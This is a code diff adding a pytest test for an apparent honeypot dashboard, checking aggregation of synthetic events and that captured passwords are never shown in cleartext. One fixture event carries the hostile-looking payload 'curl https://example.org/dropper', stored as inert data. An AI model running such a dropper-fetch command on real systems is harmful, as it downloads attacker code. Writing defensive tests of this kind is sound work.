@@ -151,6 +151,66 @@ def test_relations_expose_provenance_and_safe_credential_fingerprint(tmp_path):
     assert ip["provenance"] == "observed"
 
 
+def test_dashboard_exposes_investigation_dimensions_and_aggregates_geo_points(tmp_path):
+    store = Store(str(tmp_path / "aegis.db"))
+    timestamp = datetime.now(timezone.utc).replace(minute=0, second=0, microsecond=0).isoformat()
+    for event_type, payload in [
+        ("credential", {
+            "credential": {"username": "admin", "password": "same-secret"},
+        }),
+        ("web.payload", {
+            "payload": "curl https://example.org/dropper",
+        }),
+    ]:
+        observed = {
+            "source_ip": "203.0.113.55",
+            "service": "http",
+            "protocol": "tcp",
+            "destination_port": 8080,
+            **payload,
+        }
+        event = normalize_event({
+            "timestamp": timestamp,
+            "honeypot": "web-1",
+            "event_type": event_type,
+            "severity": "high" if event_type == "web.payload" else "medium",
+            "observed": observed,
+            "enrichment": {
+                "geo": {
+                    "source": "geo-fixture",
+                    "observed_at": timestamp,
+                    "data": {"country": "IT", "latitude": 41.9, "longitude": 12.5},
+                },
+                "asn": {
+                    "source": "asn-fixture",
+                    "observed_at": timestamp,
+                    "data": {"asn": "AS64500"},
+                },
+            },
+            "derived": {
+                "cve": [{
+                    "cve_id": "CVE-2099-0002",
+                    "rationale": "Synthetic evidence-backed fixture only.",
+                    "evidence": ["observed.payload"],
+                }]
+            } if event_type == "web.payload" else {},
+        })
+        store.ingest(event)
+
+    dashboard = store.dashboard(hours=24, include_simulation=True)
+    assert dashboard["totals"]["events"] == 2
+    assert dashboard["source_ip"][0] == {"label": "203.0.113.55", "value": 2}
+    assert dashboard["unique_source_ip_timeline"][0]["value"] == 1
+    assert dashboard["credentials"][0]["label"] == "admin"
+    assert dashboard["credential_secret_fingerprints"]
+    assert "same-secret" not in str(dashboard)
+    assert dashboard["payloads"][0]["value"] == 1
+    assert dashboard["cves"] == [{"label": "CVE-2099-0002", "value": 1}]
+    assert dashboard["map_points"][0]["count"] == 2
+    assert dashboard["map_points"][0]["session_count"] == 1
+    assert dashboard["analysis"]["provenance"]["hypotheses_in_analytics"] is False
+
+
 def test_report_never_exports_cleartext_password(tmp_path, monkeypatch):
     monkeypatch.setenv("AEGIS_STORE_CREDENTIAL_SECRETS", "true")
     store = Store(str(tmp_path / "aegis.db"))
